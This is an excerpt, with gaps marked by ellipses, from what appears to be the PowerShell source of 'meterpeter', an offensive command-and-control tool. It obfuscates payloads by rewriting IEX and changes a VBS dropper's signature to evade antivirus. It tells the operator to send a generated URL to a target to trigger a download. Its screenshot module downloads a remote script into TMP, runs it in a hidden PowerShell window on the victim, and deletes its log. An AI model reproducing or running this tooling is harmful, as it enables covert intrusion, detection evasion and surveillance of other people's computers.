...
((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "IEX","&(''.SubString.ToString()[67,72,64]-Join'')")|Set-Content -Path $IPATH$payload_name.ps1
...
If($check -ieq $False)
{
  ...
  If($Python_version)
  {
    ...
    ElseIf($FlavorSellection -eq 4)
    {
       ...
       #Change vbs obfuscator signature
       ((Get-Content -Path "$CrandleVbsName" -Raw) -Replace "Execute","dIm Microsoft:Microsoft=now:Execute")|Set-Content -Path "$CrandleVbsName"
    ...
    write-Host "[*] Send the URL generated to target to trigger download.." -ForegroundColor DarkGray;
...
"@;Write-Host $AnwsomeBanner
    ...
    If($Command -ieq "Screenshot")
    {
        ...
        write-host "   Remark: Single capture AutoDownloads the screenshot from RHOST" -ForegroundColor Yellow;
        write-host "`n`n   Modules     Description                     Remark" -ForegroundColor green;
        write-host "   -------     -----------                     ------";
        write-host "   Single      Capture one desktop screenshot  Client:User  - Privileges Required";
        write-host "   multiple    Capture multiple screenshots    Client:User  - Privileges Required";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Screenshot> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Single")
        {
        ...
        If($choise_two -ieq "multiple")
        {
           ...
           {
              #Run command
              write-host " * Background execution (more than 3 captures)`n" -ForegroundColor DarkGray;
              $Command = "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Screenshot.ps1 -OutFile `$Env:TMP\Screenshot.ps1|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File $Env:TMP\Screenshot.ps1 -Screenshot $Captures -Delay $Inbetween`";echo `" [capture] Remote Storage: C:\Users\UserName\AppData\Local\Temp\Meterpeter.zip`" `> `$Env:TMP\tdrd.log;Get-Content `$Env:TMP\tdrd.log;Remove-Item -Path `$Env:TMP\tdrd.log -Force"           
           }
           Else
           {
              #Run command
